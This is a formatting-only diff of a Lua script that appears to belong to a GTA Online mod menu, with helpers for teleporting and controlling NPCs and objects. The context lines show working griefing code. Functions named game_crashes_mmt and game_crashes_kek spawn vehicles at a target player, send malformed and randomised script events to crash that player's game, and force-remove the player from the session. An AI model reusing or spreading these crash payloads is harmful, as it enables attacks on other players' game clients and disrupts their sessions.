@@ -175,9 +175,9 @@ function _Module.teleport(entity_id, coords, kwargs)
     end
     kwargs.delay = kwargs.delay or 500
     kwargs.before_teleport = kwargs.before_teleport or function()
-    end
+        end
     kwargs.after_teleport = kwargs.after_teleport or function()
-    end
+        end
     local vehicle_id = 0
     if ped.is_ped_in_any_vehicle(entity_id) and kwargs.with_vehicle then
         vehicle_id = ped.get_vehicle_ped_is_using(entity_id)
@@ -262,7 +262,7 @@ function _Module.control_npcs(control_func, kwargs)
     kwargs.include_player = kwargs.include_player or false
     kwargs.include_dead = kwargs.include_dead or false
     kwargs.before_loop = kwargs.before_loop or function()
-    end
+        end
     kwargs.player = kwargs.player or {}
     kwargs.player.id = kwargs.player.id or player.player_id()
     kwargs.player.ped = kwargs.player.ped or player.get_player_ped(kwargs.player.id)
@@ -316,7 +316,7 @@ function _Module.control_objects(control_func, kwargs)
     kwargs = kwargs or {}
     kwargs.delay = kwargs.delay or 250
     kwargs.before_loop = kwargs.before_loop or function()
-    end
+        end
     kwargs.player = kwargs.player or {}
     kwargs.player.id = kwargs.player.id or player.player_id()
     kwargs.player.ped = kwargs.player.ped or player.get_player_ped(kwargs.player.id)
@@ -428,9 +428,9 @@ function _Module.game_crashes_mmt(target_pid)
         return false
     end
 
-    local towtruck = _Module.gen_vehicle(-1323100960, targ_player.coords, 0)
-    local tractor = _Module.gen_vehicle(-1323100960, targ_player.coords, 0)
-    local cargobob = _Module.gen_vehicle(-50547061, targ_player.coords, 0)
+    local towtruck = _Module.gen_vehicle( -1323100960, targ_player.coords, 0)
+    local tractor = _Module.gen_vehicle( -1323100960, targ_player.coords, 0)
+    local cargobob = _Module.gen_vehicle( -50547061, targ_player.coords, 0)
     local skylift = _Module.gen_vehicle(1044954915, targ_player.coords, 0)
     local inv_obj = object.create_world_object(2155335200, targ_player.coords, true, false)
     local boat = _Module.gen_vehicle(276773164, targ_player.coords, 0)
@@ -454,11 +454,11 @@ function _Module.game_crashes_mmt(target_pid)
     end
     -- system.wait(2000)
     -- entity.set_entity_coords_no_offset(self_player.ped, targ_player.coords)
-    script.trigger_script_event(-2113023004, targ_player.id, { -1, -1, 0, 0, -20, 1000 })
-    script.trigger_script_event(-1056683619, targ_player.id, { -1, -1 })
+    script.trigger_script_event( -2113023004, targ_player.id, { -1, -1, 0, 0, -20, 1000 })
+    script.trigger_script_event( -1056683619, targ_player.id, { -1, -1 })
     script.trigger_script_event(1757755807, targ_player.id, { -1, -1 })
     script.trigger_script_event(1258808115, targ_player.id, { -1, -1 })
-    script.trigger_script_event(-786546101, targ_player.id, { -1, -1 })
+    script.trigger_script_event( -786546101, targ_player.id, { -1, -1 })
     -- system.wait(3000)
     network.force_remove_player(targ_player.id)
 
@@ -470,7 +470,7 @@ function _Module.game_crashes_kek(target_pid)
     for i = 1, 19 do
         local parameters = { target_pid, -1774405356, math.random(0, 4), math.random(0, 1) }
         for i = 5, 13 do
-            parameters[#parameters + 1] = math.random(-2147483647, 2147483647)
+            parameters[#parameters + 1] = math.random( -2147483647, 2147483647)
         end
         parameters[10] = target_pid
         _Module.send_script_event(677240627, target_pid, parameters)
@@ -478,7 +478,7 @@ function _Module.game_crashes_kek(target_pid)
     for _, script_hash in ipairs({ 962740265, -1386010354, 2112408256, 677240627 }) do
         local parameters = { target_pid }
         for i = 2, 10 do
-            parameters[#parameters + 1] = math.random(-2147483647, 2147483647)
+            parameters[#parameters + 1] = math.random( -2147483647, 2147483647)
         end
         _Module.send_script_event(script_hash, target_pid, parameters)
     end
